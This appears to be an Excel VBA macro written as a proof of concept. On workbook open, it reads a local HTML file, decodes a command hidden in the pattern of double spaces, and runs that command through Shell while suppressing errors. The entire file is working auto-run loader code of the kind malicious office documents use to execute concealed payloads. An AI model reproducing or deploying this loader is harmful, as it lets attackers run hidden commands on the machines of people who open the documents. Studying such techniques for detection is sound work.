Sub htmlninja()
On Error Resume Next
    Dim fso As New FileSystemObject
    Dim txt As TextStream
    Dim strText As String

    'read and put file content into string var
    Set txt = fso.OpenTextFile("C:\Temp\yoroi_poc.htm")
    strText = txt.ReadAll
    txt.Close
    
    Dim lLoop As Long, lCount As Long
    Dim prevchar, bits, c As String

    prevchar = "nil"
    bits = ""
    lCount = Len(strText)
    
    'loop string var and check bits
        For lLoop = 0 To lCount - 1
            c = Mid(strText, lLoop + 1, 1)
            If prevchar = " " Then
                If c = " " Then
                    bits = bits & "1"
                    c = "nil"
                Else
                    bits = bits & "0"
                    c = "nil"
                End If
            End If
            prevchar = c
            
        Next lLoop
        
    'convert bits and run
        Shell (cmdBinaryToAscii(bits))

    
End Sub


Private Function cmdBinaryToAscii(bits)
Dim bin As String
Dim result As String
Dim i As Integer
Dim next_char As String
Dim ascii As Long

    bin = bits
    result = ""
    For i = 1 To Len(bin) + 18 Step 8
        next_char = Mid$(bin, i, 8)
        ascii = BinaryToLong(next_char)
        result = result & Chr$(ascii)
    Next i

    cmdBinaryToAscii = result
End Function

' Convert this binary value into a Long.
Private Function BinaryToLong(ByVal binary_value As String) _
    As Long
Dim hex_result As String
Dim nibble_num As Integer
Dim nibble_value As Integer
Dim factor As Integer
Dim bit As Integer

    ' Remove any leading &B if present.
    ' (Note: &B is not a standard prefix, it just
    ' makes some sense.)
    binary_value = UCase$(Trim$(binary_value))
    If Left$(binary_value, 2) = "&B" Then
        binary_value = Mid$(binary_value, 3)
    End If

    ' Strip out spaces in case the bytes are separated
    ' by spaces.
    binary_value = Replace(binary_value, " ", "")

    ' Left pad with zeros so we have a full 32 bits.
    binary_value = Right$(String(32, "0") & _
        binary_value, 32)

    ' Read the bits in nibbles from right to left.
    ' (A nibble is half a byte. No kidding!)
    For nibble_num = 7 To 0 Step -1
        ' Convert this nibble into a hexadecimal string.
        factor = 1
        nibble_value = 0

        ' Read the nibble's bits from right to left.
        For bit = 3 To 0 Step -1
            If Mid$(binary_value, _
                1 + nibble_num * 4 + bit, 1) = "1" _
            Then
                nibble_value = nibble_value + factor
            End If
            factor = factor * 2
        Next bit

        ' Add the nibble's value to the left of the
        ' result hex string.
        hex_result = Hex$(nibble_value) & hex_result
    Next nibble_num

    ' Convert the result string into a long.
    BinaryToLong = CLng("&H" & hex_result)
End Function



Private Sub Workbook_Open()
htmlninja
End Sub
